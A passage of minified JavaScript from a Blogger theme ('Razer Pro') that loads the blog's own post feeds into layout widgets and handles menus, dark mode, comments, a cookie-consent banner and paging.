u(e,"",i(n,{expires:-1})),!u(e)},e&&(e.cookie=u,e.removeCookie=u.remove),u});
//]]>
</script>
<!-- Theme Scripts -->
<script type='text/javascript'>
//<![CDATA[
function shortCodeIfy(e,t,a){for(var s=e.split("$"),r=/[^{\}]+(?=})/g,i=0;i<s.length;i++){var o=s[i].split("=");if(o[0].trim()==t)return null!=(a=o[1]).match(r)&&String(a.match(r)).trim()}return!1}function msgError(){return'<span class="error-msg"><b>Error:</b>&nbsp;No Results Found</span>'}function beforeLoader(){return'<div class="loader"></div>'}function getFeedUrl(e,t,a,s){switch(a){case"recent":s="/feeds/posts/default?alt=json&max-results="+t;break;default:s="comments"==e?"/feeds/comments/default?alt=json&max-results="+t:"/feeds/posts/default/-/"+a+"?alt=json&max-results="+t}return s}function getPostLink(e,t){for(var a=0;a<e[t].link.length;a++)if("alternate"==e[t].link[a].rel){var s=e[t].link[a].href;break}return s}function getPostTitle(e,t,a){return e[t].title.$t?e[t].title.$t:exportify.noTitle}function getPostTag(e,t,a){return e[t].category?'<span class="entry-category">'+e[t].category[0].term+"</span>":""}function getPostAuthor(e,t,a,s){return s=""!=exportify.postAuthorLabel?'<span class="sp">'+exportify.postAuthorLabel+"</span>":"",exportify.postAuthor?'<span class="entry-author mi">'+s+'<span class="author-name">'+e[t].author[0].name.$t+"</span></span>":""}function getPostDate(e,t,a,s,r,i){monthNames="undefined"!=typeof monthNames?monthNames:["January","February","March","April","May","June","July","August","September","October","November","December"],dateFormat="undefined"!=typeof dateFormat?dateFormat:"{m} {d}, {y}";var o=e[t].published.$t,n=o.substring(0,4),l=o.substring(5,7),c=o.substring(8,10),d=dateFormat.replace("{m}",monthNames[parseInt(l,10)-1]).replace("{d}",c).replace("{y}",n);return i=exportify.postAuthor&&""!=exportify.postDateLabel?'<span class="sp">'+exportify.postDateLabel+"</span>":"",[1==exportify.postDate?'<span class="entry-time mi">'+i+'<time class="published" datetime="'+o+'">'+d+"</time></span>":"",1==exportify.postDate?'<span class="entry-time mi"><time class="published" datetime="'+o+'">'+d+"</time></span>":""]}function getPostMeta(e,t,a,s,r){return[1==exportify.postAuthor||1==exportify.postDate?'<div class="entry-meta">'+e+t[0]+"</div>":"",1==exportify.postDate?'<div class="entry-meta">'+t[1]+"</div>":""]}function getFirstImage(e,t){var a=$("<div>").html(e).find("img:first").attr("src"),s=a.lastIndexOf("/")||0,r=a.lastIndexOf("/",s-1)||0,i=a.substring(0,r),o=a.substring(r,s),n=a.substring(s);return(o.match(/\/s[0-9]+/g)||o.match(/\/w[0-9]+/g)||"/d"==o)&&(o="/w72-h72-p-k-no-nu"),i+o+n}function getPostImage(e,t,a,s){var r=e[t].content.$t;return a=e[t].media$thumbnail?e[t].media$thumbnail.url:"https://resources.blogblog.com/img/blank.gif",r.indexOf(r.match(/<iframe(?:.+)?src=(?:.+)?(?:www.youtube.com)/g))>-1?r.indexOf("<img")>-1?r.indexOf(r.match(/<iframe(?:.+)?src=(?:.+)?(?:www.youtube.com)/g))<r.indexOf("<img")?a.replace("img.youtube.com","i.ytimg.com").replace("/default.","/maxresdefault."):getFirstImage(r):a.replace("img.youtube.com","i.ytimg.com").replace("/default.","/maxresdefault."):r.indexOf("<img")>-1?getFirstImage(r):"https://resources.blogblog.com/img/blank.gif"}function getPostImageType(e,t){return e.match("i.ytimg.com")?"is-video":"is-image"}function getPostSummary(e,t,a){if(e[t].content.$t)var s=e[t].content.$t,r='<span class="entry-excerpt excerpt">'+$("<div>").html(s).text().trim().substr(0,a)+"…</span>";else r="";return r}function getPostComments(e,t,a,s){var r=e[t].author[0].name.$t,i=e[t].author[0].gd$image.src.replace("/s113","/s72-c").replace("/s220","/s72-c"),o=e[t].title.$t;return(i.match("//img1.blogblog.com/img/blank.gif")||i.match("//img1.blogblog.com/img/b16-rounded.gif"))&&(i="//4.bp.blogspot.com/-oSjP8F09qxo/Wy1J9dp7b0I/AAAAAAAACF0/ggcRfLCFQ9s2SSaeL9BFSE2wyTYzQaTyQCK4BGAYYCw/w72-h72-p-k-no-nu/avatar.jpg"),'<div class="cmm1-item item-'+t+'"><a class="entry-inner wrap-all-link" href="'+a+'" title="'+r+'"><span class="entry-image-wrap cmm-avatar"><span class="entry-thumb" data-image="'+i+'"></span></span><div class="entry-header"><h2 class="entry-title cmm-title">'+r+'</h2><p class="cmm-snippet excerpt">'+o+"</p></div></a></div>"}function getAjax(e,t,a,s){switch(t){case"msimple":case"featured":case"block1":case"block2":case"grid1":case"grid2":case"colLeft":case"colRight":case"video":case"default":case"mini":case"comments":case"related":0==s&&(s="geterror404");var r=getFeedUrl(t,a,s);$.ajax({url:r,type:"GET",dataType:"json",cache:!0,beforeSend:function(a){switch(t){case"featured":case"block1":case"block2":case"grid1":case"grid2":case"video":case"default":case"mini":case"comments":case"related":e.html(beforeLoader()).parent().addClass("type-"+t);break;case"colLeft":case"colRight":e.html(beforeLoader())}},success:function(a){var r="";switch(t){case"msimple":r='<div class="ul mega-items">';break;case"featured":r='<div class="featured-items featured-cards">';break;case"block1":case"block2":case"grid1":case"grid2":case"video":r='<div class="content-block '+t+'-items">';break;case"colLeft":case"colRight":r='<div class="content-block col-items '+t+'-items">';break;case"default":r='<div class="default-items">';break;case"mini":r='<div class="mini-items">';break;case"comments":r='<div class="cmm1-items">';break;case"related":r='<div class="related-posts">'}var i=a.feed.entry;if(null!=i)for(var o=0,n=i;o<n.length;o++){var l=n.length,c=getPostLink(n,o),d=getPostTitle(n,o),m=getPostTag(n,o),h=getPostAuthor(n,o),f=getPostDate(n,o,m),u=getPostImage(n,o),p=getPostImageType(u,o),g=getPostMeta(h,f),y="";switch(t){case"msimple":y+='<div class="mega-item post"><a title="'+d+'" class="entry-image-wrap '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"></span></a><h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[1]+"</div>";break;case"featured":switch(o){case 0:y+='<div class="featured-item card-style item-'+o+'"><a title="'+d+'" class="entry-image-wrap before-mask '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"></span></a><div class="entry-header entry-info">'+m+'<h2 class="entry-title"><a title="'+d+'" href="'+c+'">'+d+"</a></h2>"+g[0]+getPostSummary(n,o,150)+"</div></div>";break;default:y+='<div class="featured-item card-style item-'+o+'"><a title="'+d+'" class="entry-image-wrap before-mask '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"></span></a><div class="entry-header entry-info">'+m+'<h2 class="entry-title"><a title="'+d+'" href="'+c+'">'+d+"</a></h2>"+g[0]+"</div></div>"}break;case"block1":switch(o){case 0:y+='<div class="block1-left"><div class="block1-item card-style item-'+o+'"><a title="'+d+'" class="entry-image-wrap before-mask '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"/></a><div class="entry-header entry-info">'+m+'<h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[0]+getPostSummary(n,o,150)+"</div></div></div>";break;default:y+=(1==o?'<div class="block1-right">':"")+'<div class="block1-item item-'+o+'"><a title="'+d+'" class="entry-image-wrap '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"/></a><div class="entry-header"><h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[1]+"</div></div>"+(o==l-1?"</div>":"")}break;case"block2":switch(o){case 0:y+='<div class="block2-item card-style item-'+o+'"><a title="'+d+'" class="entry-image-wrap before-mask '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"/></a><div class="entry-header entry-info">'+m+'<h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[0]+"</div></div>";break;default:y+='<div class="block2-item item-'+o+'"><a title="'+d+'" class="entry-image-wrap '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"/></a><div class="entry-header">'+m+'<h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[0]+getPostSummary(n,o,120)+"</div></div>"}break;case"grid1":y+='<div class="'+t+"-item item-"+o+'"><a title="'+d+'" class="entry-image-wrap '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"></span></a><div class="entry-header"><h2 class="entry-title"><a title="'+d+'" href="'+c+'">'+d+"</a></h2>"+g[1]+"</div></div>";break;case"grid2":y+='<div class="'+t+"-item item-"+o+'"><a title="'+d+'" class="entry-image-wrap before-mask '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"></span></a><div class="entry-header entry-info">'+m+'<h2 class="entry-title"><a title="'+d+'" href="'+c+'">'+d+"</a></h2>"+g[0]+"</div></div>";break;case"colLeft":case"colRight":switch(o){case 0:y+='<div class="col-item card-style item-'+o+'"><a title="'+d+'" class="entry-image-wrap before-mask '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"/></a><div class="entry-header entry-info">'+m+'<h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[0]+"</div></div>";break;default:y+='<div class="col-item item-'+o+'"><a title="'+d+'" class="entry-image-wrap '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"/></a><div class="entry-header"><h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[1]+"</div></div>"}break;case"video":y+='<div class="video-item card-style item-'+o+'"><a title="'+d+'" class="entry-image-wrap before-mask is-video" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"></span></a><div class="entry-header entry-info">'+m+'<h2 class="entry-title"><a title="'+d+'" href="'+c+'">'+d+"</a></h2>"+(0==o?""+g[0]:""+g[1])+"</div></div>";break;case"default":switch(o){case 0:y+='<div class="default-item card-style item-'+o+'"><a title="'+d+'" class="entry-image-wrap before-mask '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"/></a><div class="entry-header entry-info">'+m+'<h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[0]+"</div></div>";break;default:y+='<div class="default-item item-'+o+'"><a title="'+d+'" class="entry-image-wrap '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"/></a><div class="entry-header"><h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[1]+"</div></div>"}break;case"mini":y+='<div class="mini-item item-'+o+'"><a title="'+d+'" class="entry-image-wrap '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"/></a><div class="entry-header"><h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[1]+"</div></div>";break;case"comments":y+=getPostComments(n,o,c);break;case"related":y+='<div class="related-item item-'+o+'"><a title="'+d+'" class="entry-image-wrap '+p+'" href="'+c+'"><span class="entry-thumb" data-image="'+u+'"></span></a><div class="entry-header"><h2 class="entry-title"><a href="'+c+'" title="'+d+'">'+d+"</a></h2>"+g[1]+"</div></div>"}r+=y}else switch(t){case"msimple":r='<div class="ul mega-items no-items">'+msgError()+"</div>";break;default:r=msgError()}switch(t){case"msimple":r+="</div>",e.append(r).addClass("msimple"),e.find("a:first").attr("href",function(e,t){switch(s){case"recent":t=t.replace(t,"/search");break;default:t=t.replace(t,"/search/label/"+s)}return t});break;default:r+="</div>",e.html(r)}e.find("span.entry-thumb").lazyify()},error:function(){switch(t){case"msimple":e.append('<div class="ul mega-items no-items">'+msgError()+"</div>");break;default:e.html(msgError())}}})}}function ajaxMega(e,t,a,s,r){if(r.match("getcontent")){if("msimple"==t)return getAjax(e,t,a,s);e.append('<div class="ul mega-items no-items">'+msgError()+"</div>")}}function ajaxFeatured(e,t,a,s,r){if(r.match("getcontent")){if("featured"==t)return getAjax(e,t,a,s);e.html(msgError())}}function ajaxBlock(e,t,a,s,r,i,o){if(r.match("getcontent")){if("block1"==t||"block2"==t||"grid1"==t||"grid2"==t||"colLeft"==t||"colRight"==t||"video"==t)return 0!=s&&(i="recent"==s?"/search":"/search/label/"+s,o=""!=viewAllText.trim()?viewAllText:exportify.viewAll,e.parent().find(".widget-title").append('<a href="'+i+'" class="wt-l">'+o+"</a>")),getAjax(e,t,a,s);e.html(msgError())}}function ajaxWidget(e,t,a,s,r){if(r.match("getcontent")){if("default"==t||"mini"==t||"comments"==t)return getAjax(e,t,a,s);e.html(msgError())}}function ajaxRelated(e,t,a,s){return getAjax(e,t,a,s)}function disqusComments(e){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src="//"+e+".disqus.com/blogger_item.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(t)}function beautiAvatar(e){$(e).attr("src",function(e,t){return(t=(t=t.replace("//resources.blogblog.com/img/blank.gif","//4.bp.blogspot.com/-oSjP8F09qxo/Wy1J9dp7b0I/AAAAAAAACF0/ggcRfLCFQ9s2SSaeL9BFSE2wyTYzQaTyQCK4BGAYYCw/s39/avatar.jpg")).replace("//lh3.googleusercontent.com/zFdxGE77vvD2w5xHy6jkVuElKv-U9_9qLkRYK8OnbDeJPtjSZ82UPq5w6hJ-SA=s35","//4.bp.blogspot.com/-oSjP8F09qxo/Wy1J9dp7b0I/AAAAAAAACF0/ggcRfLCFQ9s2SSaeL9BFSE2wyTYzQaTyQCK4BGAYYCw/s39/avatar.jpg")).replace("/s35","/s39")})}function fixedSidebarIfy(e){$(e).each(function(e){fixedSidebar="undefined"==typeof fixedSidebar||fixedSidebar,1==fixedSidebar&&(e=1==fixedMenu?77:25,$(this).theiaStickySidebar({containerSelector:"#content-wrapper > .container",additionalMarginTop:e,additionalMarginBottom:25}))})}fixedMenu="undefined"==typeof fixedMenu||fixedMenu,viewAllText="undefined"!=typeof viewAllText?viewAllText:exportify.viewAll,$("#razer-pro-main-nav").menuify(),$("#razer-pro-main-nav .widget").addClass("show-menu"),$(".show-search").on("click",function(){$("body").addClass("search-active"),$("#main-search-wrap").fadeIn(170).find("input").focus()}),$(".hide-search").on("click",function(){$("body").removeClass("search-active"),$("#main-search-wrap").fadeOut(170).find("input").val("").blur()}),$("html").each(function(){var e=$(this);darkMode="undefined"!=typeof darkMode&&darkMode,userDarkMode="undefined"==typeof userDarkMode||userDarkMode,1!=darkMode&&0!=userDarkMode&&("dark"==localStorage.themeColor&&e.addClass("is-dark"),$(".darkmode-toggle").on("click",function(){"dark"!=localStorage.themeColor?(e.addClass("is-dark"),localStorage.themeColor="dark"):(e.removeClass("is-dark"),localStorage.themeColor="light")}))}),$(".bp-title a.wt-l").each(function(){""!=viewAllText.trim()&&$(this).text(viewAllText)}),$(".sidebar .social-icons li a").each(function(e){var t=$(this),a=t.attr("href").split("#");null!=a[1]&&""!=(e=a[1].trim())&&t.append('<span class="text">'+e+"</span>"),t.attr("href",a[0].trim())}),$(".FollowByEmail .widget-content").each(function(e,t){var a=$(this),s=a.data("shortcode");null!=s&&(e=shortCodeIfy(s,"title"),t=shortCodeIfy(s,"text"),0!=e&&a.find(".follow-by-email-title").text(e),0!=t&&a.find(".follow-by-email-text").text(t))}),$(".post-body a").each(function(){var e=$(this),t=e.html(),a=t.toLowerCase(),s=shortCodeIfy(t,"text"),r=shortCodeIfy(t,"icon"),i=shortCodeIfy(t,"color");a.match("getbutton")&&0!=s&&(e.addClass("button btn").text(s),0!=r&&e.addClass(r),0!=i&&e.addClass("colored-button").attr("style","background-color:"+i+";"))}),$(".post-body b").each(function(){var e=$(this),t=e.text(),a=t.toLowerCase().trim();a.match(/(?:\$ads\=\{1\})/g)&&e.replaceWith('<div id="razer-pro-new-before-ad"/>'),a.match(/(?:\$ads\=\{2\})/g)&&e.replaceWith('<div id="razer-pro-new-after-ad"/>'),a.match("{tocify}")&&(t=0!=shortCodeIfy(t,"title")?shortCodeIfy(t,"title"):"Table of Contents",e.replaceWith('<div class="tocify-wrap"><div class="tocify-inner"><a href="javascript:;" class="tocify-title" role="button" title="'+t+'"><span class="tocify-title-text">'+t+'</span></a><ol id="tocify"></ol></div></div>'),$(".tocify-title").each(function(e){(e=$(this)).on("click",function(){e.toggleClass("is-expanded"),$("#tocify").slideToggle(170)})}),$("#tocify").toc({content:"#post-body",headings:"h2,h3,h4"}),$("#tocify li a").each(function(e){(e=$(this)).click(function(){return $("html,body").animate({scrollTop:$(e.attr("href")).offset().top-20},500),!1})})),a.match("{contactform}")&&(e.replaceWith('<div class="contact-form"/>'),$(".contact-form").append($("#ContactForm1"))),a.match("{leftsidebar}")&&($("body").addClass("is-left"),e.remove()),a.match("{rightsidebar}")&&($("body").addClass("is-right"),e.remove()),a.match("{fullwidth}")&&($("body").addClass("no-sidebar"),e.remove())}),$("#razer-pro-new-before-ad").each(function(){var e=$(this);e.length&&$("#before-ad").appendTo(e)}),$("#razer-pro-new-after-ad").each(function(){var e=$(this);e.length&&$("#after-ad").appendTo(e)}),$("#razer-pro-main-before-ad .widget").each(function(){var e=$(this);e.length&&e.appendTo($("#before-ad"))}),$("#razer-pro-main-after-ad .widget").each(function(){var e=$(this);e.length&&e.appendTo($("#after-ad"))}),$("#razer-pro-post-footer-ads .widget").each(function(){var e=$(this);e.length&&e.appendTo($("#post-footer-ads"))}),$(".post-body blockquote").each(function(){var e=$(this),t=e.text().toLowerCase().trim(),a=e.html();if(t.match("{alertsuccess}")){const t=a.replace("{alertSuccess}","");e.replaceWith('<div class="alert-message alert-success">'+t+"</div>")}if(t.match("{alertinfo}")){const t=a.replace("{alertInfo}","");e.replaceWith('<div class="alert-message alert-info">'+t+"</div>")}if(t.match("{alertwarning}")){const t=a.replace("{alertWarning}","");e.replaceWith('<div class="alert-message alert-warning">'+t+"</div>")}if(t.match("{alerterror}")){const t=a.replace("{alertError}","");e.replaceWith('<div class="alert-message alert-error">'+t+"</div>")}if(t.match("{codebox}")){const t=a.replace("{codeBox}","");e.replaceWith('<pre class="code-box">'+t+"</pre>")}}),$(".entry-share-links .window-ify,.razer-pro-share-links .window-ify").on("click",function(){var e=$(this),t=e.data("url"),a=e.data("width"),s=e.data("height"),r=window.screen.width,i=window.screen.height,o=Math.round(r/2-a/2),n=Math.round(i/2-s/2);window.open(t,"_blank","scrollbars=yes,resizable=yes,toolbar=no,location=yes,width="+a+",height="+s+",left="+o+",top="+n).focus()}),$(".razer-pro-share-links").each(function(){var e=$(this);e.find(".show-hid a").on("click",function(){e.toggleClass("show-hidden")})}),$(".about-author .author-text").each(function(){var e=$(this),t=e.find("a");t.each(function(){var e=$(this),t=e.text().trim(),a=e.attr("href");e.replaceWith('<li class="'+t+'"><a href="'+a+'" title="'+t+'" rel="noopener noreferrer" target="_blank"/></li>')}),t.length&&e.parent().append('<ul class="author-links social social-color"></ul>'),e.find("li").appendTo(".author-links")}),$("#razer-pro-main-nav-menu li.mega-menu").each(function(e,t){var a=$(this),s=a.find("a").data("shortcode");null!=s&&(e=s.toLowerCase(),ajaxMega(a,"msimple",5,shortCodeIfy(s,"label"),e))}),$("#featured .HTML .widget-content").each(function(e){var t=$(this),a=$(window),s=t.data("shortcode");null!=s&&(mtc=s.toLowerCase(),e=shortCodeIfy(s,"label"),a.on("resize scroll",function s(){a.scrollTop()+a.height()>=t.offset().top&&(a.off("resize scroll",s),ajaxFeatured(t,"featured",3,e,mtc))}).trigger("scroll"))}),$(".content-section .HTML .widget-content").each(function(e,t,a){var s=$(this),r=$(window),i=s.data("shortcode");null!=i&&(mtc=i.toLowerCase(),e=shortCodeIfy(i,"results"),t=shortCodeIfy(i,"label"),"colLeft"!=(a=shortCodeIfy(i,"type"))&&"colRight"!=a||s.parent().addClass("column-style type-"+a),r.on("resize scroll",function i(){r.scrollTop()+r.height()>=s.offset().top&&(r.off("resize scroll",i),ajaxBlock(s,a,e,t,mtc))}).trigger("scroll"))}),$(".razer-pro-widget-ready .HTML .widget-content").each(function(e,t,a,s){var r=$(this),i=$(window),o=r.data("shortcode");null!=o&&(e=o.toLowerCase(),t=shortCodeIfy(o,"results"),a=shortCodeIfy(o,"label"),s=shortCodeIfy(o,"type"),i.on("resize scroll",function o(){i.scrollTop()+i.height()>=r.offset().top&&(i.off("resize scroll",o),ajaxWidget(r,s,t,a,e))}).trigger("scroll"))}),$("#razer-pro-related-posts .HTML").each(function(e,t){var a=$(this).data("shortcode");null!=a&&$("#related-wrap").each(function(s,r){var i=$(this),o=$(window),n=i.find(".razer-pro-related-content"),l=(e=shortCodeIfy(a,"title"),t=shortCodeIfy(a,"results"),[e,t]);s=0!=l[1]?l[1]:3,0!=l[0]&&i.find(".related-title .title").text(l[0]),r=i.find(".related-tag").data("label"),o.on("resize scroll",function e(){o.scrollTop()+o.height()>=n.offset().top&&(o.off("resize scroll",e),ajaxRelated(n,"related",s,r))}).trigger("scroll")})}),$(".razer-pro-blog-post-comments").each(function(){var e=$(this),t=e.data("shortcode"),a=shortCodeIfy(t,"type"),s="comments-system-"+a,r=e.find("#top-continue .comment-reply");switch(a){case"disqus":var i=shortCodeIfy(t,"shortname");0!=i&&(disqus_shortname=i),disqusComments(disqus_shortname),e.addClass(s).show();break;case"facebook":e.addClass(s).find("#comments").html('<div class="fb-comments" data-width="100%" data-href="'+disqus_blogger_current_url+'" order_by="time" data-numposts="5" data-lazy="true"></div>'),e.show();break;case"hide":e.hide();break;default:e.addClass("comments-system-blogger").show(),$(".entry-meta .entry-comments-link").addClass("show"),r.addClass("btn"),beautiAvatar(".avatar-image-container img")}var o=e.find(".comments .comment-reply"),n=e.find(".comments #top-continue"),l=e.find("#top-ce.comment-replybox-thread");o.on("click",function(){n.show(),l.hide()}),n.on("click",function(){n.hide(),l.show()})}),$(function(){$(".entry-image-wrap .entry-thumb,.author-avatar-wrap .author-avatar").lazyify(),$("#razer-pro-mobile-menu").each(function(){var e=$(this),t=$("#razer-pro-main-nav-menu").clone();t.attr("id","main-mobile-nav"),t.find(".mega-items").remove(),t.find(".mega-menu > a").each(function(e,t){var a=$(this),s=a.data("shortcode");null!=s&&(t="recent"==(e=shortCodeIfy(s.trim(),"label"))?"/search":"/search/label/"+e,a.attr("href",t))}),t.appendTo(e),$(".mobile-menu-toggle, .hide-razer-pro-mobile-menu, .overlay").on("click",function(){$("body").toggleClass("nav-active")}),$(".razer-pro-mobile-menu .has-sub").append('<div class="submenu-toggle"/>'),$(".razer-pro-mobile-menu .mega-menu").find(".submenu-toggle").remove(),$(".razer-pro-mobile-menu ul li .submenu-toggle").on("click",function(e){$(this).parent().hasClass("has-sub")&&(e.preventDefault(),$(this).parent().hasClass("show")?$(this).parent().removeClass("show").find("> .m-sub").slideToggle(170):$(this).parent().addClass("show").children(".m-sub").slideToggle(170))})}),$(".mm-footer .mm-social").each(function(){var e=$(this);$("#topbar-social ul.social").clone().appendTo(e)}),$(".mm-footer .mm-menu").each(function(){var e=$(this);$("#topbar-menu ul.link-list").clone().appendTo(e)}),$(".header-inner").each(function(){var e=$(this);if(1==fixedMenu&&e.length>0){var t=$(document).scrollTop(),a=e.offset().top,s=e.height(),r=a+s+s;$(window).scroll(function(){var s=$(document).scrollTop();s>r?e.addClass("is-fixed"):(s<a||s<=1)&&e.removeClass("is-fixed"),s>t?e.removeClass("show"):e.addClass("show"),t=s})}}),fixedSidebarIfy("#main-wrapper, #sidebar-wrapper"),$("#post-body iframe").each(function(){var e=$(this);e.attr("src").match("www.youtube.com")&&e.wrap('<div class="responsive-video-wrap"/>')}),$("p.comment-content").each(function(){var e=$(this);e.replaceText(/(https:\/\/\S+(\.png|\.jpeg|\.jpg|\.gif))/g,'<img src="$1"/>'),e.replaceText(/(?:https:\/\/)?(?:www\.)?(?:youtube\.com)\/(?:watch\?v=)?(.+)/g,'<div class="responsive-video-wrap"><iframe id="youtube" width="100%" height="358" src="https://www.youtube.com/embed/$1" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>')}),$("#razer-pro-load-more-link").each(function(){var e=$(this).data("load");e&&$("#razer-pro-load-more-link").show(),$("#razer-pro-load-more-link").on("click",function(t){$("#razer-pro-load-more-link").hide(),$.ajax({url:e,success:function(t){var a=$(t).find(".blog-posts");a.find(".index-post").addClass("post-animated post-fadeInUp"),$(".blog-posts").append(a.html()),(e=$(t).find("#razer-pro-load-more-link").data("load"))?$("#razer-pro-load-more-link").show():($("#razer-pro-load-more-link").hide(),$("#blog-pager .no-more").addClass("show"))},beforeSend:function(){$("#blog-pager .loading").show()},complete:function(){$("#blog-pager .loading").hide(),$(".index-post .entry-image-wrap .entry-thumb").lazyify(),fixedSidebarIfy("#main-wrapper")}}),t.preventDefault()})}),$("#razer-pro-cookie-ify").each(function(){var e=$(this),t=e.find(".widget.Text").data("shortcode");null!=t&&(ok=shortCodeIfy(t,"ok"),days=shortCodeIfy(t,"days"),0!=ok&&e.find("#razer-pro-cookie-ify-accept").text(ok),0!=days?days=Number(days):days=7),e.length>0&&("1"!==$.cookie("razer_pro_cookie_ify_consent")&&(e.css("display","block"),setTimeout(function(){e.addClass("is-visible")},10)),$("#razer-pro-cookie-ify-accept").off("click").on("click",function(t){t.preventDefault(),t.stopPropagation(),$.cookie("razer_pro_cookie_ify_consent","1",{expires:days,path:"/"}),e.removeClass("is-visible"),setTimeout(function(){e.css("display","none")},500)}),cookieChoices={})}),$("#back-top").each(function(){var e=$(this);$(window).on("scroll",function(){$(this).scrollTop()>=100?e.fadeIn(170):e.fadeOut(170),e.offset().top>=$("#footer-wrapper").offset().top-34?e.addClass("on-footer"):e.removeClass("on-footer")}),e.on("click",function(){$("html, body").animate({scrollTop:0},500)})})});
//]]>
</script>
<!-- Blogger Scripts -->
</body>
</html>
